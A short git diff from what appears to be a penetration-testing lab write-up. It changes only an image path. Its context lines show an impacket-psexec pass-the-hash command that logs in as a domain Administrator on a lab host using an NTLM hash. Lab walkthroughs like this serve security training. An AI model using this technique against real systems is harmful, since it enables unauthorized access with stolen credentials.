@@ -2957,7 +2957,7 @@ This utility can also be used to pass hashes for authentications
 impacket-psexec DANTE/Administrator@172.16.2.5 -hashes aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Great, now we can use that one liner ping sweep
 
